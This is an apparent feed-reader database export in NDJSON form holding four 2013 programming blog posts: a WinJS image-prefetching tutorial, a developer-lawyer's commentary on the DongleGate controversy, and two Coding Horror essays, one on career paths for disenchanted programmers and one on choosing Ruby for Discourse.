{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/RP09-r6Nx3Q/","title":"Pre-Process your images with promises","published":{"$wrap":"$date","v":1369064435000,"h":"2013-05-20T15:40:35.000Z"},"starred":false,"read":false,"content":"<p>For this post, I’m using Windows 8 WinJS as the vehicle. However, this approach is applicable by any method that implements an XMLHttpRequest.</p><p>Here’s the scenario: you have an application with several images and those images are stored on a remote server. The sources of each image is something like http://someserver.com/myimage.png. </p><p>Looking at a Windows 8 store app as an example, the good news is that your page will display immediately. Your images <em>may</em> display immediately. Or more likely, they will begin to display <em>after</em> the page has loaded. You may see the images incrementally appearing. This does not make for a good user experience. </p><p>The good news is that WinJS implements the Promise Pattern and XMLHttpRequest via the WinJS.xhr object. This means we can pre-fetch images and resolve them to blob URL’s and then bind our UI to the blob URL instead of the raw image url.</p><p>Using a stock WinJS Navigation Project, the following code is placed in the app.addEventListener(“activated”, function (args) {} handler:</p><pre class=\"brush: jscript; title: ; notranslate\" title=\"\">var promises = [];//Load the blob for the default image in the event a specified image URL does not work.WinJS.xhr({ url: \"images/no-available-image.png\", responseType: \"blob\" }).done(function(data) {var noImageBlob = URL.createObjectURL(data.response);//The imageResults.json file is a static result from the Bing Images API.WinJS.xhr({ url: \"js/imageResults.json\" }).done(function (data) {var results = JSON.parse(data.responseText);//Loop through the results to create the promise array.results.d.results[0].Image.forEach(function (element, index, array) {promises[index] = WinJS.xhr({ url: element.MediaUrl, responseType: \"blob\" }).then(function (e) {//When the promise executes, an imageBlob property is created//holding the image blob URLresults.d.results[0].Image[index].imageBlob = URL.createObjectURL(e.response);}, function error(e) {//If an error occurs when trying to retrieve the image//the No Image BLob URL created on line 28 is used insteadresults.d.results[0].Image[index].imageBlob = noImageBlob;});});//The join method kicks off the promises handed to it.//The promises can run in any order and finish at any time.//The done event for the join method fires after all of the promises//in the promise array have been fulfilled.WinJS.Promise.join(promises).done(function (e) {//Need to create a global namespace to hold a reference//to the images array. To facilitate data binding,//the WinJS.BindingList method is invoked, passing the//image array.WinJS.Namespace.define(\"ImageList\",{Images: new WinJS.Binding.List(results.d.results[0].Image)});;//Now that all of the pre-processing has occurred, we can now//navigate to the home page that displays the images.if (app.sessionState.history) {nav.history = app.sessionState.history;}args.setPromise(WinJS.UI.processAll().then(function () {if (nav.location) {nav.history.current.initialPlaceholder = true;return nav.navigate(nav.location, nav.state);}else {return nav.navigate(Application.navigator.home);}}));});}););</pre><p>JavasScript, being a dynamic language, we can simply augment the object from the parsed JSON. In this example, I used a static file from the Bing Image Search API. You will have to conform the object references to the specific API you are working with. In the previous code, we wait until all of the images have been fetch. In an async world, this can be a challenge. We don’t know what order the requests will be processed. In some cases, a server status 500 could result. This approach affords us an opportunity to handle that error with a place holder image. If on the other hand, you deal with the raw URL’s directly, you have no such opportunity to intercept errors.</p><p>On the HTML markup side, I have this code to bind an image tag’s src to the newly created imageBlob property. For this example, the raw URL that is returned in the response is MediaUrl. </p><pre class=\"brush: xml; title: ; notranslate\" title=\"\">&lt;section aria-label=\"Main content\" role=\"main\"&gt;&lt;div id=\"ImagesTemplate\" data-win-control=\"WinJS.Binding.Template\"&gt;&lt;div style=\"width: 150px; height: 100px;\"&gt;&lt;img src=\"#\" style=\"width: 60px; height: 60px;\"data-win-bind=\"alt: MediaUrl; src: imageBlob\" /&gt;&lt;div&gt;&lt;h4 data-win-bind=\"innerText: MediaUrl\"&gt;&lt;/h4&gt;&lt;/div&gt;&lt;/div&gt;&lt;/section&gt;&lt;div id=\"ImageListView\"data-win-control=\"WinJS.UI.ListView\"data-win-options=\"{itemDataSource : ImageList.Images.dataSource,itemTemplate: select('#ImagesTemplate')}\"&gt;&lt;/div&gt;</pre><p>In the markup, I have a WinJS ListView control that uses the ImageList.Images.dataSource as its datasource. The ListView also references a simple template to display the output.</p><p>Here is the result (looks a bit skewed due to this page’s dimensions):</p><p><a href=\"http://codebetter.com/johnvpetersen/files/2013/05/images.png\"><img src=\"http://codebetter.com/johnvpetersen/files/2013/05/images.png\" alt=\"images\" width=\"1792\" height=\"469\" class=\"alignleft size-full wp-image-587\" /></a> </p><p>When the page displays, because the images have already been pre-fetched, they will immediately display as well. This makes for a more pleasant user experience. </p><p>Looking at the first image, it has a raw URL of:</p><p>http://www.israbox.com/uploads/posts/2011-04/1303738133_john-coltrane.jpg</p><p>When pre-fetched, the blob URL is:</p><p>blob:354BAAC6-B8D8-4172-A283-4DF2F037FECD</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/RP09-r6Nx3Q\" height=\"1\" width=\"1\"/>","author":"johnvpetersen","_id":{"$wrap":"$oid","v":1019}}
{"k":"0000000084","o":"0000008325","v":"001"}
{"_id":1020,"_uid":1020,"_dt":1373741607089,"_s":"9208988e0d8573d630570d6913bb370f"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/lMFZbIXzErE/","title":"DongleGate: A Legal Perspective and some social commentary","published":{"$wrap":"$date","v":1363988726000,"h":"2013-03-22T21:45:26.000Z"},"starred":false,"read":false,"content":"<p>Those of you that know me, know that I’m both a software developer and a lawyer. I’ve not commented on the #DongleGate issue – except to say that this issue has privacy, first amendment and civil litigation ramifications. Those of us witnessing this escapade have seen at least 1 guy lose his job and this just in, the complainant Adria Richards (http://butyoureagirl.com/) has lost her job as a developer evangelist for SendGrid. Here’s the blog post from her former employer: <a href=\"http://blog.sendgrid.com/a-difficult-situation/\">http://blog.sendgrid.com/a-difficult-situation/</a>.</p><p>One thing we can agree on, there is a massive lack of maturity in this business. At one time or another, including yours truly, has been guilty of an off-color joke. Most of the times, at community gatherings like conferences; we are typically amongst friends and feel comfortable that we can be ourselves, letting our guard down. At the end of the day, we must rely on the fact that in this business, we have to have a thick skin and that we are adults. That in no way is meant to justify offensive comments and that somebody like Adria didn’t have a right to be offended. She did have a right to be offended. And to that, it’s not for anybody else to question it. It’s enough for anybody to say they were offended – and others should respect that. That said, does it mean the offended have an open ended license to exact whatever retribution they want on the offenders? No…. In these community gatherings, there is a level of privacy, within the community cocoon; we have a reasonable expectation to.  </p><p>We see the t-shirt shirt = “Fork you”. We see on open source projects: “Fork me on GitHub”. Doesn’t take a rocket scientist to see the double entendre here. If one is to where that shirt in public, does that give anybody who is offended license to snap a picture, tweet it, and then hope that some misfortune befalls that person? I don’t think such license is granted. </p><p>Consider this YouTube video from Ms. Richard’s: <a href=\"http://www.youtube.com/watch?v=nMpJSKbsmgQ\">http://www.youtube.com/watch?v=nMpJSKbsmgQ</a>. There’s a saying in the law that in matters of equity, you have to have “Clean Hands.” Is it permissible for her to be offended as she was when she makes a video that could be taken as offensive by others? At about 3:03 into the video, she talks about an incident that was done to her – that could very well be taken as offensive, and she let it pass. In this case, she decided to not let something pass…something that WAS NOT said directly to her. If I was prosecuting this case, and I was going to depose Ms. Richards, this is a line of questioning I would surly explore to great details. What was her real motivation here?</p><p> This gets to my first question:</p><p>Was there a reasonable expectation of privacy by these two gentlemen? </p><p>I believe there was. They were having a private conversation, which Ms. Richards overheard. Yes, this was a public place. Did she have the right to express her indignation at those comments to these two gentlemen? Absolutely yes. In fact, that would have been the more impactful thing to do. That would be a proportional response. Reporting the incident to the PyCon staff is not appropriate. They are not there to police what people say. Note, these two guys didn’t say the comment to her. She thrust herself into their conversation. By the same token, the two guys allowed her to confront them. She didn’t. Instead, she took their picture and posted a tweet. And from there, SHE took what was a private thing and made it public. She made the situation worse. In that regard, she violated the privacy rights of these two men, notwithstanding their comments. Speaking of those comments, only her, the two guys and maybe one or two others know what the precise words were. The first result, at least one of the guys lost his job.</p><p>Next question..<br />Does the guy who got fired have a cause of action against Ms. Richards? </p><p>This is the part you want to pay attention to as you should think very carefully about the consequences of tweeting something that is private and further, identifying specific people where harm could come to them. First, did these two guys have a right to say what they said, no matter how stupid it was? Yes, they had a right. There is such a thing as a First Amendment last I checked. It’s also not illegal to be stupid. Did the guy who got fired, his employer, have a right to fire him? If he works in an employment at-will state, the answer is yes. Is he totally out of luck? No.. He can sue Ms. Richards for Tortious Interference with an Employment Relationship. She knew and intended a certain level of a negative outcome to these two gentlemen. That’s malice. While his employer may be on good ground to fire him, he can nevertheless sue Ms. Richards to recover damages. There may also be a cause of action on defamation grounds. These two guys are being labeled as sexists when all that may have happened was a joke, off color as it may have been, that offended this one person. That too may be the basis of a cause of action.</p><p>Next question..<br />Is there any other entity that could be liable?</p><p>As SendGrid has already admitted, Ms. Richard’s was there in her capacity as a representative as a SendGrid Employee. Ms. Richard’s did not do SendGrid any favors when she tweeted that she had SendGrid’s full support – a claim that SendGrid didn’t dispute. In the law, there is the legal doctrine of “Respondeat Superior.” It effectively means that the master is liable for the actions of his agent. Ms. Richards has a large Twitter following and that is due in least in part to her former job as a developer evangelist for SendGrid. There’s a strong argument to be made that SendGrid is liable, at least in part,  for Ms. Richard’s actions – regardless of the fact that they terminated her services. </p><p>This whole episode illustrates again the importance of how we react emotionally and the legal consequences therein. If I’m the gentlemen who lost his job, I’m exploring my legal options – and there are legal options. Above all, this is a teachable moment. If you are offended at something somebody does, consider the context. 99.99% of the time, these matters are best handled privately. Takes more courage and is more impactful when you communicate your disdain to the offending party directly. If your goal is to change behavior that will more likely have the desired effect. Sure, you may be told to eff-off.  That’s a risk…a risk worth taking. </p><p>How about conference organizers?</p><p>I understand that PyCon has modified their code of condut… Didn’t know that such a thing existed. I would always suggest to any conference organizer to NOT get into the business of policing their attendees. Rather, I’d rely on the venue staff for that. Obviously, if somebody is disruptive, boot their tails out. These guys didn’t appear to be disruptive at all for the record – not that it really matters in this case.</p><p>A word about the “Brogrammer” culture..</p><p>You probably know about it. If not, look it up on our favorite search engine. The fact is, guys are often not the sharpest knives in the drawer socially and are often in need of an increase in maturity level. Women have a tough enough time in this business. I know several women that do a lot of work in getting more girls interested in software development. Sad as it is, Adria Richards did more to set that effort back than the two guys she was offended by. That’s a perfect example of irony!! It’s really a shame. Ms. Richards looks to be a pretty sharp individual – one who appears to have better common sense than she displayed here. Learn from it folks. </p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/lMFZbIXzErE\" height=\"1\" width=\"1\"/>","author":"johnvpetersen","_id":{"$wrap":"$oid","v":1020}}
{"k":"0000000084","o":"0000011343","v":"001"}
{"_id":1021,"_uid":1021,"_dt":1373741607090,"_s":"2df768c84d254b42056e15d6eefb2214"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2013/04/so-you-dont-want-to-be-a-programmer-after-all.html","title":"So You Don't Want to be a Programmer After All","published":{"$wrap":"$date","v":1367279134000,"h":"2013-04-29T23:45:34.000Z"},"starred":false,"read":false,"content":"<p>I get a surprising number of emails from career programmers who have spent some time in the profession and eventually decided it just isn't for them. Most recently this:</p><blockquote>I finished a computer science degree last year, worked about a year in the Java EE stack. I liked requirements engineering and more 'management stuff' in university, but let's face it: you tend to be driven to be a programmer.</p><p>I enjoy programming itself. I'm not doing it <i>that</i> badly, I even do it better than some people. But it's too frustrating. Stupidly complex stuff (that people consider \"standard\" even if it's extremely complicated!), fighting against the computer, dumb errors, configuration, and stuff that people even worse than me implemented and I have to take care of. New stuff which is supposed to be incredibly easy, and it's just one more framework.</p><p>I think I realized I don't want to program because I landed at a company where people are quite good. And I honestly think I won't achieve that level, ever. And I don't enjoy programming as a hobby.</p><p>I'm sure that I'm good enough to be able to make a living continuing as I am … but I don't want to.</p></blockquote><p>And this:</p><blockquote><p>Since the first year of studying programming at university I have known in my heart that computer programming is not meant for me, but I was afraid to do anything about it and here I am now 12 years later programming with no passion. I am a career programmer and an average one at best.</p><p>I come to work every day with no passion I just do it to pay the bills. I have done some good projects but I am not at all into it.</p></blockquote><p>It was always our hope that <b>concrete, substantive programming career questions</b> could be asked on Stack Overflow, and some <a href=\"http://meta.stackoverflow.com/questions/12373/which-types-of-programming-related-questions-are-appropriate\">early ad-hoc polling</a> indicated that career questions might be accepted by the community, but if you look at <a href=\"http://meta.stackoverflow.com/questions/12373/which-types-of-programming-related-questions-are-appropriate\">later poll results</a>, it's clear that the career questions came out <i>juuuust</i> under the cutoff point as determined by the Stack Overflow community.</p><p>Well, what about the rest of the <a href=\"http://stackexchange.com/sites?view=list\">Stack Exchange network</a>? How about our sister site at <a href=\"http://blog.stackoverflow.com/2010/12/introducing-programmers-stackexchange-com/\">programmers.stackexchange</a> which is less about programming problems with source code and more about whiteboard style conceptual programming questions? Apparently, career questions are <a href=\"http://meta.programmers.stackexchange.com/questions/3828/canonical-what-can-i-do-with-my-programming-skills-if-im-weary-of-heads-down-c\">not welcome there either</a>. But wait! Surely programmer career questions are a fit on a site that's explicitly <i>about</i> career related topics? The very same question was asked on <a href=\"http://workplace.stackexchange.com/\">workplace.stackexchange</a>:<p><blockquote><p>I'm graduating soon with a Bachelor's in Software Engineering, however during the course of getting my degree I decided I do not want to be a programmer.</p><p>I minored in Business Management and really enjoyed that, particularly the management side of psychology and the basics of the processes involved with restructuring a business, but don't really want to throw away my programming degree either.</p><p>Is there a field for someone with a Software Engineering degree who wants to get into business management instead of programming? I'd like to combine my knowledge of making software with some kind of business process oriented work. How should I go about changing to this field? Is this possible without going back to school?</p></blockquote></p><a href=\"http://workplace.stackexchange.com/questions/2658/what-kind-of-business-fields-are-available-to-a-programmer-who-no-longer-wants-t\">Nope. Sorry.</a> That was closed, too, either because it was seen as a 'recommend me a job' or because it's too specific to programming. Pick your interpretation.</p><p>I am sympathetic to this quandary because <b>career questions, by their very nature, tend to be so narrow and opinionated</b> that they are frequently only useful to the person who asked – which is completely counter to the goal of Stack Exchange. You know, endless permutations of things like \"My boss Jeff is a total jerk, he constantly changes my code without asking and overrides me all the time with his BS arbitrary decisions, should I quit?\"* I can understand deciding to outlaw the entire class of career questions because they're frequently soft, opinion-y, and highly specific to the person asking. It's easier to throw out the whole category rather than do the painful work of sifting through them all to reveal those few rare workable gems.</p><p>Stack Exchange wants <b>questions that are as useful to as many people as possible</b>, and actively closes (sorry, <a href=\"http://meta.stackoverflow.com/questions/173497/every-close-has-its-thorn-replace-close-with-on-hold-for-the-first-five-d\">\"puts on hold\"</a>) the ones that are not. I will now reprint my favorite diagram, ever, which attempts to explain this:</p><p><img alt=\"Who does your question apply to?\" title=\"Who does your question apply to?\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b019101a6e7b7970c-800wi\" border=\"0\" /></p><p>The colored part in this target that says \"All Programmers\"? That's the goal at Stack Exchange. Well, maybe \"all <a href=\"http://bicycles.stackexchange.com\">bicyclists</a>\", or \"all <a href=\"http://cooking.stackexchange.com/\">cooks</a>\", but you get the general idea.</p><p>We try our best to teach you to ask questions that hit this sweet spot: answers that get you the information you so desperately need, yes, but also help your peers along the way without devolving into <a href=\"http://www.codinghorror.com/blog/2009/03/procrastination-and-the-bikeshed-effect.html\">meaningless opinion honeypots</a>. Overshoot and you get either \"Too Broad\" or \"Too Localized\". Hitting that target with our questions – or at least making a best faith effort to attempt to, anyway – is how we maximize the results of our collective efforts. Write once, read many.</p><p>But back to the topic: <b>what career options are available to programmers who no longer want to program?</b> I feel there <i>is</i> a way to answer this question that would be helpful to many other programmers, that <i>is</i> supported by facts and data and science.</p><p>Programming is indeed a field that <a href=\"http://www.codinghorror.com/blog/2008/12/programming-love-it-or-leave-it.html\">does require some passion</a>. If you've been programming for a few years and haven't developed a taste for it by now, it seems doubtful to me that anyone would suddenly develop one overnight. However, if you were able to stick with doing something you're not very enthusiastic about for a period of years, maybe there's still a kernel of something there to work with. Or perhaps you're just wearing golden handcuffs.</p><p><img alt=\"Golden-handcuffs\" title=\"Golden-handcuffs\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017eeaaf686e970d-800wi\" width=\"600\" height=\"253\" /></p><p>Environment plays a big part in any job, no matter <a href=\"http://online.wsj.com/article/SB10001424127887324874204578439154095008558.html\">how intrinsically amazing that job might be</a>. Who do you work with? What are you working on? What kind of environment do you program in:</p><ul><li>A startup?</li><li>A small business?</li><li>A big business?</li><li>A consultancy?</li><li>Freelance?</li></ul><p>The \"programming\" in each of these situations, and the other peer programmers you'll be working with, will be radically different. Consider if the <i>environment</i> and <i>peers</i> may be the problem. Have you tried changing those up, first, before conclusively deciding you need to leave the field forever?</p><p>Beyond that, there are lots of <b>related fields where programming skills are advantageous</b>, without having \"sit down and write code all day\" as part of the job description. So let's think. What jobs exist where …</p><p><ol><li>Programming skills and a deep technical background are typically in the hiring requirements.</li><li>There is a documented record of ex-programmers moving into these positions and being successful.</li><li>There are a reasonable number of such jobs available worldwide.</li></ol><p>Here's where I really wished I could have asked this on Stack Exchange, because I'd much rather <b>crowdsource data to support the above three points</b>, but the best I could come up with on my own is:</p><ul><li><a href=\"http://www.25hoursaday.com/weblog/CommentView.aspx?guid=25c92015-9172-4bc8-8f91-f901f8811aff\">Product/Program Manager</a></li><li>Project Manager</li><li>QA / Testing (good testers are <a href=\"http://www.codinghorror.com/blog/2006/09/making-developers-cry-since-1995.html\">worth their weight in gold</a>)</li><li>Build Engineering (this stuff <a href=\"http://www.codinghorror.com/blog/2007/10/the-f5-key-is-not-a-build-process.html\">is hard</a>)</li><li>System Administrator</li><li>Technical Sales</li><li>Technical Writer</li><li>Business Analyst / Programming Analyst</li></ul><p>In many of these roles, people that truly know the nuts and bolts of programming are quite rare. That's unfortunate, because a deep technical background lets you actually <i>understand</i> and explain what is going on, to customers, to business stakeholders, to peers on related teams. At the very least nobody can dazzle you with technical BS, because you're equipped to call their bluff.</p><p>I've seen less \"adept\" programmers self-select into related roles at previous jobs and do very well, both financially and professionally. There is a <i>lot</i> of stuff that goes on around programming that is not heads down code writing, where your programming skills are a competitive advantage.</p><p>Career questions are tough, because ultimately only you can decide what's right for you. But if you're a programmer who no longer likes to program, your technical background can at least <b>open the door to a number of related professions</b>.</p><p><small>* Yes, you should quit. Jeff is a total jerkface.</small></p><table><tr><td class=\"welovecodinghorror\">[advertisement] How are you showing off your awesome? Create a <a href=\"http://careers.stackoverflow.com/cv\" rel=\"nofollow\">Stack Overflow Careers profile</a> and show off all of your hard work from Stack Overflow, Github, and virtually every other coding site. Who knows, you might even get recruited for a great <a href=\"http://careers.stackoverflow.com/jobs\" rel=\"nofollow\">new position</a>!</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1021}}
{"k":"0000000084","o":"0000014354","v":"001"}
{"_id":1022,"_uid":1022,"_dt":1373741607091,"_s":"d9c51681c33242b76607bb159f0ddaad"}
{"subscription":{"$wrap":"$oid","v":16},"link":"http://www.codinghorror.com/blog/2013/03/why-ruby.html","title":"Why Ruby?","published":{"$wrap":"$date","v":1363941248000,"h":"2013-03-22T08:34:08.000Z"},"starred":false,"read":false,"content":"<p>I've been a Microsoft developer for decades now. I weaned myself on various flavors of <a href=\"http://www.codinghorror.com/blog/2008/04/everything-i-needed-to-know-about-programming-i-learned-from-basic.html\">home computer Microsoft Basic</a>, and I got my first paid programming gigs in Microsoft FoxPro, Microsoft Access, and Microsoft Visual Basic. I have seen the future of programming, my friends, and it is terrible CRUD apps running on Wintel boxes!</p><p>Of course, we went on to build Stack Overflow in Microsoft .NET. That's a big reason it's still as fast as it is. So one of the most frequently asked questions after we <a href=\"http://www.codinghorror.com/blog/2013/02/civilized-discourse-construction-kit.html\">announced Discourse</a> was:<p><blockquote><p>Why didn't you build Discourse in .NET, too?</p></blockquote></p><p>Let me be clear about something: I <i>love</i> .NET. One of the greatest thrills of my professional career was getting the opportunity to place a Coding Horror sticker in the hand of <a href=\"http://en.wikipedia.org/wiki/Anders_Hejlsberg\">Anders Hejlsberg</a>. Pardon my inner fanboy for a moment, but oh man I still get chills. There are maybe fifty world class computer language designers on the planet. Anders is the only one of them who built Turbo Pascal and Delphi. It is thanks to Anders' expert guidance that .NET started out such a remarkably well designed language – literally what Java should have been on every conceivable level – and has continued to evolve in remarkably practical ways over the last 10 years, leveraging the strengths of other influential dynamically typed languages.</p><p><img alt=\"Turbo-pascal\" title=\"Turbo-pascal\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017d42306e26970c-800wi\" width=\"700\" height=\"395\" /></p><p>All that said, it's true that I intentionally chose <i>not</i> to use .NET for my next project. So you might expect to find an angry, righteous screed here about how much happier I am leaving the oppressive shackles of my Microsoft masters behind. <i>Free at last, free at least, thank God almighty I'm free at last!</i</p><p>Sorry. <a href=\"http://www.codinghorror.com/blog/2007/05/giving-up-on-microsoft.html\">I already wrote that post five years ago</a>.</p><p>Like any pragmatic programmer, I pick the appropriate tool for the job at hand. And as much as I may love .NET, <b>it would be an extraordinarily poor choice for an 100% open source project like Discourse.</b> Why? Three reasons, mainly:</p><ol><li><p><b>The licensing.</b> My God, <i>the licensing</i>. It's not so much the money, as the infernal, mind-bending tax code level complexity involved in making sure all your software is properly licensed: determining what 'level' and 'edition' you are licensed at, who is licensed to use what, which servers are licensed... wait, what? Sorry, I passed out there for a minute when I was attacked by <a href=\"http://www.codinghorror.com/blog/2009/07/oh-you-wanted-awesome-edition.html\">rabid licensing weasels</a>.</p><p>I'm not inclined to make grand pronouncements about the future of software, but if anything kills off commercial software, let me tell you, it won't be open source software. They needn't bother. Commercial software will gleefully strangle itself to death on its own licensing terms.</p></li><li><p><b>The friction</b>. If you want to build truly viable open source software, you need people to contribute to your project, so that it is a living, breathing, growing thing. And unless you can download all the software you need to hack on your project freely from all over the Internet, no strings attached, there's just … too much friction.</p>If Stack Overflow taught me anything, it is that we now live in a world where the next brilliant software engineer can come from anywhere on the planet. I'm talking places <a href=\"http://www.codinghorror.com/blog/2009/03/the-ugly-american-programmer.html\">this ugly American programmer</a> has never heard of, where they speak crazy nonsense moon languages I can't understand. But get this. Stand back while I blow your mind, people: these brilliant programmers <i>still code in the same keywords we do!</i> I know, crazy, right?</p><p>Getting up and running with a Microsoft stack is just plain too hard for a developer in, say, Argentina, or Nepal, or Bulgaria. Open source operating systems, languages, and tool chains are the great equalizer, the basis for the next great generation of programmers all over the world who are going to help us change the world.</p></li><li><p><b>The ecosystem</b>. When I was at Stack Exchange <a href=\"http://blog.stackoverflow.com/2012/02/stack-exchange-open-source-projects/\">we strove mightily</a> to make as much of our infrastructure open source as we could. It was something that we made explicit in the compensation guidelines, this idea that we would all be (partially) judged by how much we could do in public, and try to leave behind as many useful, public artifacts of our work as we could. Because wasn't all of Stack Exchange itself, from the very first day, <a href=\"http://blog.stackoverflow.com/2009/06/stack-overflow-creative-commons-data-dump/\">built on your Creative Commons contributions</a> that we all share ownership of?</p><p>You can certainly build open source software in .NET. And many do. But it never feels natural. It never feels right. Nobody accepts your patch to a core .NET class library no matter how hard you try. It always feels like you're swimming upstream, in a world of small and large businesses using .NET that really aren't interested in sharing their code with the world – probably because they know it would suck if they did, anyway. It is just not a native part of the Microsoft .NET culture to make things open source, <i>especially not the things that suck</i>. If you are afraid the things you share will suck, that fear will render you incapable of truly and deeply giving back. The most, uh, delightful… bit of open source communities is how they aren't afraid to let it \"all hang out\", so to speak.</p><p>So as a result, for any given task in .NET you might have – if you're lucky – a choice of maybe two decent-ish libraries. Whereas in any popular open source language, you'll <i>easily</i> have a dozen choices for the same task. Yeah, maybe six of them will be broken, obsolete, useless, or downright crazy. But hey, even factoring in some natural open source spoilage, you're still ahead by a factor of three! <i>A winner is you!</i></p></li></ol><p>As I wrote <a href=\"http://www.codinghorror.com/blog/2007/05/giving-up-on-microsoft.html\">five years ago</a>:</p><blockquote>I'm a pragmatist. For now, I choose to live in the Microsoft universe. But that doesn't mean I'm ignorant of how the other half lives. There's always more than one way to do it, and just because I chose one particular way doesn't make it the right way – or even a particularly good way. Choosing to be provincial and insular is a sure-fire path to ignorance. Learn how the other half lives. Get to know some developers who don't live in the exact same world you do. Find out what tools they're using, and why. If, after getting your feet wet on both sides of the fence, you decide the other half is living better and you want to join them, then I bid you a fond farewell.</blockquote></p>I no longer live in the Microsoft universe any more. Right, wrong, good, evil, that's just how it turned out for the project we wanted to build.</p><img alt=\"Im-ok-with-this\" title=\"Im-ok-with-this\" src=\"http://www.codinghorror.com/.a/6a0120a85dcdae970b017c38010328970b-800wi\" width=\"596\" height=\"329\" /><p>However, I'd also be lying if I didn't mention that I truly believe the sort of project we are building in Discourse does represent most future software. If you squint your eyes a little, I think you can see a future not too far in the distance where .NET is a specialized niche outside the mainstream.<p>But <b>why Ruby?</b> Well, the short and not very glamorous answer is that I had narrowed it down to either Python or Ruby, and my original co-founder <a href=\"http://eviltrout.com/\">Robin Ward</a> has been building major Rails apps since 2006. So that clinched it.</p><p>I've always been a little intrigued by Ruby, mostly because of <a href=\"https://sites.google.com/site/steveyegge2/tour-de-babel\">the absolutely gushing praise Steve Yegge had for the language way back in 2006</a>. I've never forgotten this.</p><blockquote><p>For the most part, Ruby took Perl's string processing and Unix integration as-is, meaning the syntax is identical, and so right there, before anything else happens, you already have the Best of Perl. And that's a great start, especially if you don't take the Rest of Perl.</p><p>But then Matz took the best of list processing from Lisp, and the best of OO from Smalltalk and other languages, and the best of iterators from CLU, and pretty much the best of everything from everyone.</p><p>And he somehow made it all work together so well that you don't even notice that it has all that stuff. I learned Ruby faster than any other language, out of maybe 30 or 40 total; it took me about 3 days before I was more comfortable using Ruby than I was in Perl, after eight years of Perl hacking. It's so consistent that you start being able to guess how things will work, and you're right most of the time. It's beautiful. And fun. And practical.</p></blockquote><p>Steve is one of those polyglot programmers I <a href=\"http://www.codinghorror.com/blog/2012/07/but-you-did-not-persuade-me.html\">respect so much</a> that I basically just take whatever his opinion is, provided it's not about something wacky like gun control or feminism or T'Pau, and accept it as fact.</p><p>I apologize, Steve. I'm sorry it took me 7 years to get around to Ruby. But maybe I was better off waiting a while anyway:</p><ul><li><p>Ruby is a decent performer, but you really need to <b>throw fast hardware at it for good performance</b>. Yeah, I know, <a href=\"http://www.codinghorror.com/blog/2006/02/the-day-performance-didnt-matter-any-more.html\">interpreted languages are what they are</a>, and caching, database, network, blah blah blah. Still, we obtained the absolute fastest CPUs you could buy for the Discourse servers, 4.0 Ghz Ivy Bridge Xeons, and performance is just … <i>good</i> on today's fastest hardware. Not great. <i>Good.</i></p><p>Yes, I'll admit that I am utterly spoiled by the JIT compiled performance of .NET. That's what I am used to.  I do sometimes pine away for the bad old days of .NET when we could build pages that serve in well under 50 milliseconds without thinking about it too hard. Interpreted languages aren't going to be able to reach those performance levels. But I can only imagine how rough Ruby performance had to be back in the dark ages of 2006 when CPUs and servers were <i>five times slower than they are today!</i> I'm so very glad that I am hitting Ruby now, with the strong wind of many solid years of Moore's law at our backs.</p></p><li><p>Ruby is <b>maturing up nicely</b> in the <a href=\"http://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/\">2.0 language release</a>, which happened not more than a month after Discourse was announced. So, yes, the downside is that Ruby is slow. But the upside is there is a <i>lot</i> of low hanging performance fruit in Ruby-land. Like.. <i>a lot</i> a lot. On Discourse we got an across the board 20% performance improvement just upgrading to Ruby 2.0, and we nearly <i>doubled</i> our performance by <a href=\"http://meta.discourse.org/t/tuning-ruby-and-rails-for-discourse/4126\">increasing the default Ruby garbage collection limit</a>. From a future performance perspective, Ruby is nothing but upside.</p><li><p>Ruby <b>isn't cool any more</b>. Yeah, you heard me. It's not cool to write Ruby code any more. All the cool people moved on to slinging Scala and Node.js years ago. Our project isn't cool, it's just a bunch of boring old Ruby code. Personally, I'm <i>thrilled</i> that Ruby is now mature enough that the community no longer needs to bother with the pretense of being the coolest kid on the block. That means the rest of us who just like to Get Shit Done can roll up our sleeves and focus on the mission of building stuff with our peers rather than frantically running around trying to <a href=\"http://www.codinghorror.com/blog/2008/01/the-magpie-developer.html\">suss out the next shiny thing</a>.</p></ul><p>And of <i>course</i> the Ruby community is, and always has been, amazing. We never want for great open source gems and great open source contributors. Now is a fantastic time to get into Ruby, in my opinion, whatever your background is.</p>(However, It's also worth mentioning that Discourse is, if anything, even more of a <b>JavaScript project</b> than a Ruby on Rails project. Don't believe me? Just go to <a href=\"http://try.discourse.org\">try.discourse.org</a> and view source. A Discourse forum is not so much a website as it is a full-blown JavaScript application that happens to run in your browser.)</p><p>Even if done in good will and for the best interests of the project, it's still a little scary to totally change your programming stripes overnight after two decades. I've always believed that great programmers learn to love more than one language and programming environment – and I hope the Discourse project is an opportunity for <i>everyone</i> to learn and grow, not just me. <b>So <a href=\"https://github.com/discourse/discourse\">go fork us on GitHub</a> already!</b></p><table><tr><td class=\"welovecodinghorror\">[advertisement] Hiring developers? Post your open positions with <a href=\"http://careers.stackoverflow.com\" rel=\"nofollow\">Stack Overflow Careers</a> and reach over 20MM awesome devs already on Stack Overflow. Create <a href=\"http://careers.stackoverflow.com/jobs/post\" rel=\"nofollow\"> your satisfaction-guaranteed job listing</a> today!</td></tr></table>","author":false,"_id":{"$wrap":"$oid","v":1022}}
{"k":"0000000084","o":"0000008959","v":"001"}
{"_id":1023,"_uid":1023,"_dt":1373741607092,"_s":"105ec3a8c7cef986400db7db9c98b69a"}
